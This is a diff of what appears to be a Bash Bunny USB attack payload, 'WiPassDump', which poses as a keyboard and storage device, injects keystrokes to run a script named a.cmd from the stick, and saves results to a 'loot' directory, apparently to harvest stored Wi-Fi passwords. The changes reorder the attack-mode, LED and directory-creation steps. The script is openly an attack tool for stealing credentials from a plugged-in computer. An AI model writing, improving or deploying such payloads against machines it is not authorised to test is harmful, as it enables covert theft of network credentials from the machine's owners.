@@ -12,7 +12,8 @@
 
 LED R 200
 
-ATTACKMODE HID STORAGE
+# Create directory to dump infos
+mkdir -p /root/udisk/loot/WiPassDump
 
 # Source bunny_helpers.sh to get environment variable SWITCH_POSITION
 source bunny_helpers.sh
@@ -20,8 +21,7 @@ source bunny_helpers.sh
 # Set language accordingly
 Q SET_LANGUAGE ca
 
-# Create directory to dump infos
-mkdir -p /root/udisk/loot/WiPassDump
+ATTACKMODE HID STORAGE
 
 LED B 200
 
@@ -44,12 +44,13 @@ Q STRING '/a.cmd'"'"')'
 Q ENTER
 
 # Wait for a.cmd to finish and exit
+
+LED R B 500
+
 Q DELAY 3000
 Q STRING exit
 Q ENTER
 
-LED R B 500
 sync
-ATTACKMODE STORAGE
 
 LED G
